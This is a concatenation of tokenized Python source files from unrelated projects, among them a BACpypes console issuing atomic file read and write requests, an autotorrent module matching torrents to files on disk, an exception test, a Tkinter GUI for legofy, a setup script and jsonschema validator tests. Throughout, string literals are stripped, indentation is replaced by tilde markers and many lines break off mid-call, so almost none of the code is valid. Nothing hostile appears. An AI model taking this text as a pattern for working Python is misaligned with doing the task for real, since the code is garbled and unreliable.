) , \n 
) \n 
request . pduDestination = Address ( addr ) \n 
if _debug : TestConsoleCmd . _debug ( "    - request: %r" , request ) \n 
\n 
# give it to the application \n 
this_application . request ( request ) \n 
\n 
~~ except Exception , e : \n 
~~~ TestConsoleCmd . _exception ( "exception: %r" , e ) \n 
\n 
~~ ~~ def do_readstream ( self , args ) : \n 
~~~ """readstream <addr> <inst> <start> <count>""" \n 
args = args . split ( ) \n 
if _debug : TestConsoleCmd . _debug ( "do_readstream %r" , args ) \n 
\n 
try : \n 
~~~ addr , obj_inst , start_position , octet_count = args \n 
\n 
obj_type = \n 
obj_inst = int ( obj_inst ) \n 
start_position = int ( start_position ) \n 
octet_count = int ( octet_count ) \n 
\n 
# build a request \n 
request = AtomicReadFileRequest ( \n 
fileIdentifier = ( obj_type , obj_inst ) , \n 
accessMethod = AtomicReadFileRequestAccessMethodChoice ( \n 
streamAccess = AtomicReadFileRequestAccessMethodChoiceStreamAccess ( \n 
fileStartPosition = start_position , \n 
requestedOctetCount = octet_count , \n 
) , \n 
) , \n 
) \n 
request . pduDestination = Address ( addr ) \n 
if _debug : TestConsoleCmd . _debug ( "    - request: %r" , request ) \n 
\n 
# give it to the application \n 
this_application . request ( request ) \n 
\n 
~~ except Exception , e : \n 
~~~ TestConsoleCmd . _exception ( "exception: %r" , e ) \n 
\n 
~~ ~~ def do_writerecord ( self , args ) : \n 
~~~ """writerecord <addr> <inst> <start> <count> [ <data> ... ]""" \n 
args = args . split ( ) \n 
if _debug : TestConsoleCmd . _debug ( "do_writerecord %r" , args ) \n 
\n 
try : \n 
~~~ addr , obj_inst , start_record , record_count = args [ 0 : 4 ] \n 
\n 
obj_type = \n 
obj_inst = int ( obj_inst ) \n 
start_record = int ( start_record ) \n 
record_count = int ( record_count ) \n 
record_data = list ( args [ 4 : ] ) \n 
\n 
# build a request \n 
request = AtomicWriteFileRequest ( \n 
fileIdentifier = ( obj_type , obj_inst ) , \n 
accessMethod = AtomicWriteFileRequestAccessMethodChoice ( \n 
recordAccess = AtomicWriteFileRequestAccessMethodChoiceRecordAccess ( \n 
fileStartRecord = start_record , \n 
recordCount = record_count , \n 
fileRecordData = record_data , \n 
) , \n 
) , \n 
) \n 
request . pduDestination = Address ( addr ) \n 
if _debug : TestConsoleCmd . _debug ( "    - request: %r" , request ) \n 
\n 
# give it to the application \n 
this_application . request ( request ) \n 
\n 
~~ except Exception , e : \n 
~~~ TestConsoleCmd . _exception ( "exception: %r" , e ) \n 
\n 
~~ ~~ def do_writestream ( self , args ) : \n 
~~~ """writestream <addr> <inst> <start> <data>""" \n 
args = args . split ( ) \n 
if _debug : TestConsoleCmd . _debug ( "do_writestream %r" , args ) \n 
\n 
try : \n 
~~~ addr , obj_inst , start_position , data = args \n 
\n 
obj_type = \n 
obj_inst = int ( obj_inst ) \n 
start_position = int ( start_position ) \n 
\n 
# build a request \n 
request = AtomicWriteFileRequest ( \n 
fileIdentifier = ( obj_type , obj_inst ) , \n 
accessMethod = AtomicWriteFileRequestAccessMethodChoice ( \n 
streamAccess = AtomicWriteFileRequestAccessMethodChoiceStreamAccess ( \n 
fileStartPosition = start_position , \n 
fileData = data , \n 
) , \n 
) , \n 
) \n 
request . pduDestination = Address ( addr ) \n 
if _debug : TestConsoleCmd . _debug ( "    - request: %r" , request ) \n 
\n 
# give it to the application \n 
this_application . request ( request ) \n 
\n 
~~ except Exception , e : \n 
~~~ TestConsoleCmd . _exception ( "exception: %r" , e ) \n 
\n 
# \n 
#   __main__ \n 
# \n 
\n 
~~ ~~ ~~ try : \n 
# parse the command line arguments \n 
~~~ args = ConfigArgumentParser ( description = __doc__ ) . parse_args ( ) \n 
\n 
if _debug : _log . debug ( "initialization" ) \n 
if _debug : _log . debug ( "    - args: %r" , args ) \n 
\n 
# make a device object \n 
this_device = LocalDeviceObject ( \n 
objectName = args . ini . objectname , \n 
objectIdentifier = int ( args . ini . objectidentifier ) , \n 
maxApduLengthAccepted = int ( args . ini . maxapdulengthaccepted ) , \n 
segmentationSupported = args . ini . segmentationsupported , \n 
vendorIdentifier = int ( args . ini . vendoridentifier ) , \n 
) \n 
\n 
# make a simple application \n 
this_application = TestApplication ( this_device , args . ini . address ) \n 
\n 
# get the services supported \n 
services_supported = this_application . get_services_supported ( ) \n 
if _debug : _log . debug ( "    - services_supported: %r" , services_supported ) \n 
\n 
# let the device object know \n 
this_device . protocolServicesSupported = services_supported . value \n 
\n 
# make a console \n 
this_console = TestConsoleCmd ( ) \n 
\n 
_log . debug ( "running" ) \n 
\n 
run ( ) \n 
\n 
~~ except Exception , e : \n 
~~~ _log . exception ( "an error has occurred: %s" , e ) \n 
~~ finally : \n 
~~~ _log . debug ( "finally" ) \n 
#!/usr/bin/python \n 
\n 
~~ """\nTest BACpypes PDU Module\n""" \n 
\n 
from . import test_address \n 
from __future__ import division , unicode_literals \n 
\n 
import os \n 
import hashlib \n 
import logging \n 
\n 
from collections import defaultdict \n 
\n 
from . bencode import bencode , bdecode \n 
from . humanize import humanize_bytes \n 
from . utils import is_unsplitable , get_root_of_unsplitable , Pieces \n 
\n 
logger = logging . getLogger ( ) \n 
\n 
class Color : \n 
~~~ BLACK = \n 
RED = \n 
GREEN = \n 
YELLOW = \n 
BLUE = \n 
PINK = \n 
CYAN = \n 
WHITE = \n 
ENDC = \n 
\n 
~~ COLOR_OK = Color . GREEN \n 
COLOR_MISSING_FILES = Color . RED \n 
COLOR_ALREADY_SEEDING = Color . BLUE \n 
COLOR_FOLDER_EXIST_NOT_SEEDING = Color . YELLOW \n 
COLOR_FAILED_TO_ADD_TO_CLIENT = Color . PINK \n 
\n 
class Status : \n 
~~~ OK = 0 \n 
MISSING_FILES = 1 \n 
ALREADY_SEEDING = 2 \n 
FOLDER_EXIST_NOT_SEEDING = 3 \n 
FAILED_TO_ADD_TO_CLIENT = 4 \n 
\n 
~~ status_messages = { \n 
Status . OK : % ( COLOR_OK , Color . ENDC ) , \n 
Status . MISSING_FILES : % ( COLOR_MISSING_FILES , Color . ENDC ) , \n 
Status . ALREADY_SEEDING : % ( COLOR_ALREADY_SEEDING , Color . ENDC ) , \n 
Status . FOLDER_EXIST_NOT_SEEDING : % ( COLOR_FOLDER_EXIST_NOT_SEEDING , Color . ENDC ) , \n 
Status . FAILED_TO_ADD_TO_CLIENT : % ( COLOR_FAILED_TO_ADD_TO_CLIENT , Color . ENDC ) , \n 
} \n 
\n 
CHUNK_SIZE = 65536 \n 
\n 
class UnknownLinkTypeException ( Exception ) : \n 
~~~ pass \n 
\n 
~~ class IllegalPathException ( Exception ) : \n 
~~~ pass \n 
\n 
~~ class AutoTorrent ( object ) : \n 
~~~ def __init__ ( self , db , client , store_path , add_limit_size , add_limit_percent , delete_torrents , link_type ~~~ self . db = db \n 
self . client = client \n 
self . store_path = store_path \n 
self . add_limit_size = add_limit_size \n 
self . add_limit_percent = add_limit_percent \n 
self . delete_torrents = delete_torrents \n 
self . link_type = link_type \n 
self . torrents_seeded = set ( ) \n 
\n 
~~ def try_decode ( self , value ) : \n 
~~~ try : \n 
~~~ return value . decode ( ) \n 
~~ except UnicodeDecodeError : \n 
~~~ logger . debug ( % value ) \n 
\n 
~~ return value . decode ( ) \n 
\n 
~~ def is_legal_path ( self , path ) : \n 
~~~ for p in path : \n 
~~~ if p in [ , ] or in p : \n 
~~~ return False \n 
~~ ~~ return True \n 
\n 
~~ def populate_torrents_seeded ( self ) : \n 
~~~ """\n        Fetches a list of currently-seeded info hashes\n        """ \n 
self . torrents_seeded = set ( x . lower ( ) for x in self . client . get_torrents ( ) ) \n 
\n 
~~ def get_info_hash ( self , torrent ) : \n 
~~~ """\n        Creates the info hash of a torrent\n        """ \n 
return hashlib . sha1 ( bencode ( torrent [ ] ) ) . hexdigest ( ) \n 
\n 
~~ def find_hash_checks ( self , torrent , result ) : \n 
~~~ """\n        Uses hash checking to find pieces\n        """ \n 
modified_result = False \n 
pieces = Pieces ( torrent ) \n 
\n 
if self . db . hash_slow_mode : \n 
~~~ logger . info ( ) \n 
self . db . build_hash_size_table ( ) \n 
\n 
~~ start_size = 0 \n 
end_size = 0 \n 
logger . info ( ) \n 
for f in result : \n 
~~~ start_size = end_size \n 
end_size += f [ ] \n 
\n 
if f [ ] : \n 
~~~ continue \n 
\n 
~~ files_to_check = [ ] \n 
logger . debug ( ) \n 
\n 
if self . db . hash_size_mode : \n 
~~~ logger . debug ( ) \n 
files_to_check += self . db . find_hash_size ( f [ ] ) \n 
\n 
~~ if self . db . hash_name_mode : \n 
~~~ logger . debug ( ) \n 
name = f [ ] [ - 1 ] \n 
files_to_check += self . db . find_hash_name ( name ) \n 
\n 
~~ if self . db . hash_slow_mode : \n 
~~~ logger . debug ( ) \n 
files_to_check += self . db . find_hash_varying_size ( f [ ] ) \n 
\n 
~~ logger . debug ( % len ( files_to_check ) ) \n 
\n 
checked_files = set ( ) \n 
for db_file in files_to_check : \n 
~~~ if db_file in checked_files : \n 
~~~ logger . debug ( % db_file ) \n 
\n 
~~ checked_files . add ( db_file ) \n 
logger . info ( % db_file ) \n 
match_start , match_end = pieces . match_file ( db_file , start_size , end_size ) \n 
logger . info ( % ( db_file , match_start , match_end \n 
if match_start or match_end : # this file is all-good \n 
~~~ size = os . path . getsize ( db_file ) \n 
if size != f [ ] : # size does not match, need to align file \n 
~~~ logger . debug ( ) \n 
if match_start and match_end : \n 
~~~ logger . debug ( ) \n 
modification_point = pieces . find_piece_breakpoint ( db_file , start_size , end_size ~~ elif match_start : \n 
~~~ logger . debug ( ) \n 
modification_point = min ( f [ ] , size ) \n 
~~ elif match_end : \n 
~~~ logger . debug ( ) \n 
modification_point = 0 \n 
\n 
~~ if size > f [ ] : \n 
~~~ modification_action = \n 
~~ else : \n 
~~~ modification_action = \n 
\n 
~~ f [ ] = False \n 
f [ ] = ( , modification_action , modification_point ) \n 
modified_result = True \n 
~~ else : \n 
~~~ logger . debug ( ) \n 
f [ ] = True \n 
\n 
~~ f [ ] = db_file \n 
break \n 
\n 
~~ ~~ ~~ return modified_result , result \n 
\n 
~~ def index_torrent ( self , torrent ) : \n 
~~~ """\n        Indexes the files in the torrent.\n        """ \n 
torrent_name = torrent [ ] [ ] \n 
logger . debug ( % ( torrent_name , ) ) \n 
torrent_name = self . try_decode ( torrent_name ) \n 
if not self . is_legal_path ( [ torrent_name ] ) : \n 
~~~ raise IllegalPathException ( % torrent_name \n 
~~ logger . info ( % torrent_name ) \n 
\n 
if self . db . exact_mode : \n 
~~~ prefix = if in torrent [ ] else \n 
\n 
paths = self . db . find_exact_file_path ( prefix , torrent_name ) \n 
if paths : \n 
~~~ for path in paths : \n 
~~~ logger . debug ( % path ) \n 
if prefix == : \n 
~~~ logger . info ( ) \n 
size = os . path . getsize ( path ) \n 
if torrent [ ] [ ] != size : \n 
~~~ continue \n 
\n 
~~ return { : , \n 
: os . path . dirname ( path ) , \n 
: [ { \n 
: path , \n 
: size , \n 
: [ torrent_name ] , \n 
: True , \n 
} ] } \n 
~~ else : \n 
~~~ result = [ ] \n 
for f in torrent [ ] [ ] : \n 
~~~ orig_path = [ self . try_decode ( x ) for x in f [ ] ] \n 
p = os . path . join ( path , * orig_path ) \n 
\n 
if not os . path . isfile ( p ) : \n 
~~~ logger . debug ( % p ) \n 
break \n 
\n 
~~ size = os . path . getsize ( p ) \n 
if size != f [ ] : \n 
~~~ logger . debug ( break \n 
\n 
~~ result . append ( { \n 
: p , \n 
: f [ ] , \n 
: orig_path , \n 
: True , \n 
} ) \n 
~~ else : \n 
~~~ logger . info ( ) \n 
return { : , \n 
: path , \n 
: result } \n 
\n 
\n 
~~ ~~ ~~ ~~ ~~ result = [ ] \n 
if in torrent [ ] : # multifile torrent \n 
~~~ files_sorted = { } \n 
files = { } \n 
if in torrent [ ] : \n 
\n 
~~~ i = 0 \n 
path_files = defaultdict ( list ) \n 
for f in torrent [ ] [ ] : \n 
~~~ logger . debug ( % ( f , ) ) \n 
orig_path = [ self . try_decode ( x ) for x in f [ ] if x ] # remove empty fragments if not self . is_legal_path ( orig_path ) : \n 
~~~ raise IllegalPathException ( % \n 
~~ path = [ torrent_name ] + orig_path \n 
name = path . pop ( ) \n 
\n 
path_files [ os . path . join ( * path ) ] . append ( { \n 
: orig_path , \n 
: f [ ] , \n 
} ) \n 
\n 
files_sorted [ . join ( orig_path ) ] = i \n 
i += 1 \n 
\n 
~~ ~~ if self . db . unsplitable_mode : \n 
~~~ unsplitable_paths = set ( ) \n 
for path , files in path_files . items ( ) : \n 
~~~ if is_unsplitable ( f [ ] [ - 1 ] for f in files ) : \n 
~~~ path = path . split ( os . sep ) \n 
name = get_root_of_unsplitable ( path ) \n 
if not name : \n 
~~~ continue \n 
\n 
~~ while path [ - 1 ] != name : \n 
~~~ path . pop ( ) \n 
~~ unsplitable_paths . add ( os . path . join ( * path ) ) \n 
\n 
~~ ~~ ~~ for path , files in path_files . items ( ) : \n 
~~~ if self . db . unsplitable_mode : \n 
~~~ path = path . split ( os . sep ) \n 
while path and os . path . join ( * path ) not in unsplitable_paths : \n 
~~~ path . pop ( ) \n 
~~ ~~ else : \n 
~~~ path = None \n 
\n 
~~ if path : \n 
~~~ name = path [ - 1 ] \n 
for f in files : \n 
~~~ actual_path = self . db . find_unsplitable_file_path ( name , f [ ] , f [ f [ ] = actual_path \n 
f [ ] = actual_path is not None \n 
~~ result += files \n 
~~ else : \n 
~~~ for f in files : \n 
~~~ actual_path = self . db . find_file_path ( f [ ] [ - 1 ] , f [ ] ) \n 
f [ ] = actual_path \n 
f [ ] = actual_path is not None \n 
~~ result += files \n 
# re-sort the torrent to fit original ordering \n 
~~ ~~ result = sorted ( result , key = lambda x : files_sorted [ . join ( x [ ] ) ] ) \n 
\n 
~~ else : # singlefile torrent \n 
~~~ length = torrent [ ] [ ] \n 
actual_path = self . db . find_file_path ( torrent_name , length ) \n 
\n 
result . append ( { \n 
: actual_path , \n 
: length , \n 
: [ torrent_name ] , \n 
: actual_path is not None , \n 
} ) \n 
\n 
~~ mode = \n 
if self . db . hash_mode : \n 
~~~ modified_result , result = self . find_hash_checks ( torrent , result ) \n 
if modified_result : \n 
~~~ mode = \n 
\n 
~~ ~~ return { : mode , : result } \n 
\n 
~~ def parse_torrent ( self , torrent ) : \n 
~~~ """\n        Parses the torrent and finds the physical location of files\n        in the torrent\n        """ \n 
files = self . index_torrent ( torrent ) \n 
\n 
found_size , missing_size = 0 , 0 \n 
for f in files [ ] : \n 
~~~ if f [ ] or f . get ( ) : \n 
~~~ found_size += f [ ] \n 
~~ else : \n 
~~~ missing_size += f [ ] \n 
\n 
~~ ~~ return found_size , missing_size , files \n 
\n 
~~ def link_files ( self , destination_path , files ) : \n 
~~~ """\n        Links the files to the destination_path if they are found.\n        """ \n 
if not os . path . isdir ( destination_path ) : \n 
~~~ os . makedirs ( destination_path ) \n 
\n 
~~ for f in files : \n 
~~~ if f [ ] : \n 
~~~ destination = os . path . join ( destination_path , * f [ ] ) \n 
\n 
file_path = os . path . dirname ( destination ) \n 
if not os . path . isdir ( file_path ) : \n 
~~~ logger . debug ( % file_path ) \n 
os . makedirs ( file_path ) \n 
\n 
~~ logger . debug ( % ( self . link_type , f [ ] , destination \n 
if self . link_type == : \n 
~~~ os . symlink ( f [ ] , destination ) \n 
~~ elif self . link_type == : \n 
~~~ os . link ( f [ ] , destination ) \n 
~~ else : \n 
~~~ raise UnknownLinkTypeException ( % self . link_type ) \n 
\n 
~~ ~~ ~~ ~~ def rewrite_hashed_files ( self , destination_path , files ) : \n 
~~~ """\n        Rewrites files from the actual_path to the correct file inside destination_path.\n        """ \n 
if not os . path . isdir ( destination_path ) : \n 
~~~ os . makedirs ( destination_path ) \n 
\n 
~~ for f in files : \n 
~~~ if not f [ ] and in f : \n 
~~~ destination = os . path . join ( destination_path , * f [ ] ) \n 
\n 
file_path = os . path . dirname ( destination ) \n 
if not os . path . isdir ( file_path ) : \n 
~~~ logger . debug ( % file_path ) \n 
os . makedirs ( file_path ) \n 
\n 
~~ logger . debug ( % ( f [ ] , destination ) ) \n 
\n 
_ , modification_action , modification_point = f [ ] \n 
current_size = os . path . getsize ( f [ ] ) \n 
expected_size = f [ ] \n 
diff = abs ( current_size - expected_size ) \n 
\n 
# write until modification_point, do action, write rest of file \n 
\n 
modified = False \n 
bytes_written = 0 \n 
with open ( destination , ) as output_fp : \n 
~~~ with open ( f [ ] , ) as input_fp : \n 
~~~ logger . debug ( while True : \n 
~~~ if not modified and bytes_written == modification_point : \n 
~~~ logger . debug ( % ( modification_action modified = True \n 
if modification_action == : \n 
~~~ seek_point = bytes_written + diff \n 
logger . debug ( input_fp . seek ( seek_point ) \n 
~~ elif modification_action == : \n 
~~~ logger . debug ( % diff ) \n 
while diff > 0 : \n 
~~~ write_bytes = min ( CHUNK_SIZE , diff ) \n 
output_fp . write ( * write_bytes ) \n 
diff -= write_bytes \n 
\n 
~~ ~~ ~~ read_bytes = CHUNK_SIZE \n 
if not modified : \n 
~~~ read_bytes = min ( read_bytes , modification_point - bytes_written ) \n 
\n 
~~ logger . debug ( % ( read_bytes , ) ) \n 
data = input_fp . read ( read_bytes ) \n 
if not data : \n 
~~~ break \n 
~~ output_fp . write ( data ) \n 
bytes_written += read_bytes \n 
~~ ~~ ~~ logger . debug ( ) \n 
\n 
~~ ~~ ~~ def handle_torrentfile ( self , path , dry_run = False ) : \n 
~~~ """\n        Checks a torrentfile for files to seed, groups them by found / not found.\n        The result will also include the total size of missing / not missing files.\n        """ \n 
logger . info ( % path ) \n 
\n 
torrent = self . open_torrentfile ( path ) \n 
\n 
if self . check_torrent_in_client ( torrent ) : \n 
~~~ self . print_status ( Status . ALREADY_SEEDING , path , ) \n 
if self . delete_torrents : \n 
~~~ logger . info ( % path ) \n 
os . remove ( path ) \n 
~~ return Status . ALREADY_SEEDING \n 
\n 
~~ found_size , missing_size , files = self . parse_torrent ( torrent ) \n 
missing_percent = ( missing_size / ( found_size + missing_size ) ) * 100 \n 
found_percent = 100 - missing_percent \n 
would_not_add = missing_size and missing_percent > self . add_limit_percent or missing_size > \n 
if dry_run : \n 
~~~ return found_size , missing_size , would_not_add , [ f [ ] for f in files [ \n 
~~ if would_not_add : \n 
~~~ logger . info ( % ( path , found_percent self . print_status ( Status . MISSING_FILES , path , return Status . MISSING_FILES \n 
\n 
~~ if files [ ] == or files [ ] == : \n 
~~~ logger . info ( ) \n 
destination_path = os . path . join ( self . store_path , os . path . splitext ( os . path . basename ( path ) \n 
if os . path . isdir ( destination_path ) : \n 
~~~ logger . info ( % destination_path ) \n 
self . print_status ( Status . FOLDER_EXIST_NOT_SEEDING , path , return Status . FOLDER_EXIST_NOT_SEEDING \n 
\n 
~~ self . link_files ( destination_path , files [ ] ) \n 
~~ elif files [ ] == : \n 
~~~ logger . info ( ) \n 
destination_path = files [ ] \n 
\n 
~~ fast_resume = True \n 
if files [ ] == : \n 
~~~ fast_resume = False \n 
logger . info ( ) \n 
self . rewrite_hashed_files ( destination_path , files [ ] ) \n 
\n 
~~ if self . delete_torrents : \n 
~~~ logger . info ( % path ) \n 
os . remove ( path ) \n 
\n 
~~ if self . client . add_torrent ( torrent , destination_path , files [ ] , fast_resume ) : \n 
~~~ self . print_status ( Status . OK , path , ) \n 
return Status . OK \n 
~~ else : \n 
~~~ self . print_status ( Status . FAILED_TO_ADD_TO_CLIENT , path , return Status . FAILED_TO_ADD_TO_CLIENT \n 
\n 
~~ ~~ def check_torrent_in_client ( self , torrent ) : \n 
~~~ """\n        Checks if a torrent is currently seeded\n        """ \n 
info_hash = self . get_info_hash ( torrent ) \n 
return info_hash in self . torrents_seeded \n 
\n 
~~ def open_torrentfile ( self , path ) : \n 
~~~ """\n        Opens and parses a torrent file\n        """ \n 
with open ( path , ) as f : \n 
~~~ return bdecode ( f . read ( ) ) \n 
\n 
~~ ~~ def print_status ( self , status , torrentfile , message ) : \n 
~~~ print ( % ( % status_messages [ status ] , os . path . splitext ( os . path . basename ( ~~ ~~ import pytest \n 
\n 
import exceptions \n 
\n 
\n 
def test_exceptions ( ) : \n 
# testing exception inheritance \n 
~~~ with pytest . raises ( Exception ) : \n 
~~~ raise exceptions . CardinalException \n 
\n 
~~ with pytest . raises ( exceptions . CardinalException ) : \n 
~~~ raise exceptions . InternalError \n 
\n 
~~ with pytest . raises ( exceptions . CardinalException ) : \n 
~~~ raise exceptions . PluginError \n 
\n 
~~ with pytest . raises ( exceptions . CardinalException ) : \n 
~~~ raise exceptions . CommandNotFoundError \n 
\n 
~~ with pytest . raises ( exceptions . CardinalException ) : \n 
~~~ raise exceptions . ConfigNotFoundError \n 
\n 
~~ with pytest . raises ( exceptions . CardinalException ) : \n 
~~~ raise exceptions . AmbiguousConfigError \n 
\n 
~~ with pytest . raises ( exceptions . CardinalException ) : \n 
~~~ raise exceptions . EventAlreadyExistsError \n 
\n 
~~ with pytest . raises ( exceptions . CardinalException ) : \n 
~~~ raise exceptions . EventDoesNotExistError \n 
\n 
~~ with pytest . raises ( exceptions . CardinalException ) : \n 
~~~ raise exceptions . EventCallbackError \n 
\n 
~~ with pytest . raises ( exceptions . CardinalException ) : \n 
~~~ raise exceptions . EventRejectedMessage \n 
~~ ~~ import os \n 
import legofy \n 
import tkinter as tk \n 
import tkinter . ttk as ttk \n 
from tkinter import filedialog \n 
import tkinter . messagebox as tkmsg \n 
\n 
LEGO_PALETTE = ( , , , , , , ) \n 
\n 
class LegofyGui ( tk . Tk ) : \n 
~~~ def __init__ ( self , * args , ** kwargs ) : \n 
~~~ super ( ) . __init__ ( * args , ** kwargs ) \n 
self . wm_title ( "Legofy!" ) \n 
self . iconbitmap ( os . path . dirname ( os . path . realpath ( __file__ ) ) + ) \n 
self . resizable ( False , False ) \n 
self . body = LegofyGuiMainFrame ( self ) \n 
self . body . grid ( row = 0 , column = 0 , padx = 10 , pady = 10 ) \n 
\n 
\n 
~~ ~~ class LegofyGuiMainFrame ( tk . Frame ) : \n 
\n 
~~~ def __init__ ( self , * args , ** kwargs ) : \n 
~~~ super ( ) . __init__ ( * args , ** kwargs ) \n 
\n 
self . chosenFile = None \n 
self . chosenFilePath = tk . StringVar ( ) \n 
\n 
self . pathField = tk . Entry ( self , width = 40 , textvariable = self . chosenFilePath , state = tk . DISABLED self . pathField . grid ( row = 0 , column = 0 , padx = 10 ) \n 
\n 
self . selectFile = tk . Button ( self , text = "Choose file..." , command = self . choose_a_file ) \n 
self . selectFile . grid ( row = 0 , column = 1 ) \n 
\n 
self . groupFrame = tk . LabelFrame ( self , text = "Params" , padx = 5 , pady = 5 ) \n 
self . groupFrame . grid ( row = 1 , column = 0 , columnspan = 2 , ) \n 
\n 
self . colorPaletteLabel = tk . Label ( self . groupFrame , text = ) \n 
self . colorPaletteLabel . grid ( row = 0 , column = 0 ) \n 
\n 
self . colorPalette = ttk . Combobox ( self . groupFrame ) \n 
self . colorPalette [ ] = LEGO_PALETTE \n 
self . colorPalette . current ( 0 ) \n 
self . colorPalette . grid ( row = 0 , column = 1 ) \n 
\n 
self . brickNumberScale = tk . Scale ( self . groupFrame , from_ = 1 , to = 200 , orient = tk . HORIZONTAL , label self . brickNumberScale . set ( 30 ) \n 
self . brickNumberScale . grid ( row = 1 , column = 0 , columnspan = 2 , ) \n 
\n 
self . convertFile = tk . Button ( text = "Legofy this image!" , command = self . convert_file ) \n 
self . convertFile . grid ( row = 2 , column = 0 , columnspan = 2 ) \n 
\n 
\n 
~~ def choose_a_file ( self ) : \n 
\n 
~~~ options = { } \n 
options [ ] = \n 
options [ ] = [ ( , ) , \n 
( , ) , \n 
( , ) , ] \n 
options [ ] = os . path . realpath ( "\\\\" ) \n 
options [ ] = \n 
options [ ] = self \n 
options [ ] = \n 
\n 
self . chosenFile = filedialog . askopenfile ( mode = , ** options ) \n 
if self . chosenFile : \n 
~~~ self . chosenFilePath . set ( self . chosenFile . name ) \n 
\n 
\n 
~~ ~~ def convert_file ( self ) : \n 
~~~ try : \n 
~~~ if self . chosenFile is not None : \n 
\n 
~~~ palette = self . colorPalette . get ( ) \n 
\n 
if palette in LEGO_PALETTE and palette != : \n 
~~~ legofy . main ( self . chosenFile . name , size = self . brickNumberScale . get ( ) , palette_mode ~~ else : \n 
~~~ legofy . main ( self . chosenFile . name , size = self . brickNumberScale . get ( ) ) \n 
\n 
~~ tkmsg . showinfo ( "Success!" , "Your image has been legofied!" ) \n 
~~ else : \n 
~~~ tkmsg . showerror ( "File not found" , "Please select a file before legofying" ) \n 
~~ ~~ except Exception as e : \n 
~~~ tkmsg . showerror ( "Error" , str ( e ) ) \n 
\n 
\n 
\n 
~~ ~~ ~~ if __name__ == : \n 
~~~ app = LegofyGui ( ) \n 
app . mainloop ( ) \n 
~~ from distutils . core import setup \n 
\n 
from condent import __version__ \n 
\n 
\n 
with open ( "README.rst" ) as readme : \n 
~~~ long_description = readme . read ( ) \n 
\n 
\n 
~~ classifiers = [ \n 
"Development Status :: 3 - Alpha" , \n 
"Intended Audience :: Developers" , \n 
"License :: OSI Approved :: MIT License" , \n 
"Operating System :: OS Independent" , \n 
"Programming Language :: Python" , \n 
"Programming Language :: Python :: 2" , \n 
"Programming Language :: Python :: 2.6" , \n 
"Programming Language :: Python :: 2.7" , \n 
"Programming Language :: Python :: 3" , \n 
"Programming Language :: Python :: 3.1" , \n 
"Programming Language :: Python :: 3.2" , \n 
"Programming Language :: Python :: Implementation :: CPython" , \n 
"Programming Language :: Python :: Implementation :: PyPy" , \n 
] \n 
\n 
\n 
setup ( \n 
name = "condent" , \n 
version = __version__ , \n 
py_modules = [ "condent" ] , \n 
scripts = [ "bin/condent" ] , \n 
author = "Julian Berman" , \n 
author_email = "Julian@GrayVines.com" , \n 
classifiers = classifiers , \n 
description = "A simple reindent for containers that reindents as I like it" , \n 
license = "MIT/X" , \n 
long_description = long_description , \n 
url = "http://github.com/Julian/condent" , \n 
) \n 
from pyvi import window \n 
from pyvi . modes import normal \n 
\n 
\n 
class Editor ( object ) : \n 
\n 
~~~ _command = None \n 
active_tab = None \n 
\n 
def __init__ ( self , tabs = None , config = None , normal = normal ) : \n 
~~~ self . config = config \n 
self . mode = self . normal = normal \n 
self . count = None \n 
\n 
if tabs is None : \n 
~~~ tabs = self . tabs = [ window . Tab ( self ) ] \n 
~~ else : \n 
~~~ tabs = self . tabs = list ( tabs ) \n 
\n 
~~ if tabs : \n 
~~~ self . active_tab = tabs [ 0 ] \n 
\n 
~~ ~~ @ property \n 
def active_window ( self ) : \n 
~~~ return self . active_tab . active_window \n 
\n 
~~ def keypress ( self , keys ) : \n 
~~~ return self . mode . keypress ( self , keys ) \n 
~~ ~~ from collections import deque \n 
from contextlib import contextmanager \n 
import json \n 
\n 
from jsonschema import FormatChecker , ValidationError \n 
from jsonschema . tests . compat import mock , unittest \n 
from jsonschema . validators import ( \n 
RefResolutionError , UnknownType , Draft3Validator , \n 
Draft4Validator , RefResolver , create , extend , validator_for , validate , \n 
) \n 
\n 
\n 
class TestCreateAndExtend ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . meta_schema = { u"properties" : { u"smelly" : { } } } \n 
self . smelly = mock . MagicMock ( ) \n 
self . validators = { u"smelly" : self . smelly } \n 
self . types = { u"dict" : dict } \n 
self . Validator = create ( \n 
meta_schema = self . meta_schema , \n 
validators = self . validators , \n 
default_types = self . types , \n 
) \n 
\n 
self . validator_value = 12 \n 
self . schema = { u"smelly" : self . validator_value } \n 
self . validator = self . Validator ( self . schema ) \n 
\n 
~~ def test_attrs ( self ) : \n 
~~~ self . assertEqual ( self . Validator . VALIDATORS , self . validators ) \n 
self . assertEqual ( self . Validator . META_SCHEMA , self . meta_schema ) \n 
self . assertEqual ( self . Validator . DEFAULT_TYPES , self . types ) \n 
\n 
~~ def test_init ( self ) : \n 
~~~ self . assertEqual ( self . validator . schema , self . schema ) \n 
\n 
~~ def test_iter_errors ( self ) : \n 
~~~ instance = "hello" \n 
\n 
self . smelly . return_value = [ ] \n 
self . assertEqual ( list ( self . validator . iter_errors ( instance ) ) , [ ] ) \n 
\n 
error = mock . Mock ( ) \n 
self . smelly . return_value = [ error ] \n 
self . assertEqual ( list ( self . validator . iter_errors ( instance ) ) , [ error ] ) \n 
\n 
self . smelly . assert_called_with ( \n 
self . validator , self . validator_value , instance , self . schema , \n 
) \n 
\n 
~~ def test_if_a_version_is_provided_it_is_registered ( self ) : \n 
~~~ with mock . patch ( "jsonschema.validators.validates" ) as validates : \n 
~~~ validates . side_effect = lambda version : lambda cls : cls \n 
Validator = create ( meta_schema = { u"id" : "" } , version = "my version" ) \n 
~~ validates . assert_called_once_with ( "my version" ) \n 
self . assertEqual ( Validator . __name__ , "MyVersionValidator" ) \n 
\n 
~~ def test_if_a_version_is_not_provided_it_is_not_registered ( self ) : \n 
~~~ with mock . patch ( "jsonschema.validators.validates" ) as validates : \n 
~~~ create ( meta_schema = { u"id" : "id" } ) \n 
~~ self . assertFalse ( validates . called ) \n 
\n 
~~ def test_extend ( self ) : \n 
~~~ validators = dict ( self . Validator . VALIDATORS ) \n 
new = mock . Mock ( ) \n 
\n 
Extended = extend ( self . Validator , validators = { u"a new one" : new } ) \n 
\n 
validators . update ( [ ( u"a new one" , new ) ] ) \n 
self . assertEqual ( Extended . VALIDATORS , validators ) \n 
self . assertNotIn ( u"a new one" , self . Validator . VALIDATORS ) \n 
\n 
self . assertEqual ( Extended . META_SCHEMA , self . Validator . META_SCHEMA ) \n 
self . assertEqual ( Extended . DEFAULT_TYPES , self . Validator . DEFAULT_TYPES ) \n 
\n 
\n 
~~ ~~ class TestIterErrors ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . validator = Draft3Validator ( { } ) \n 
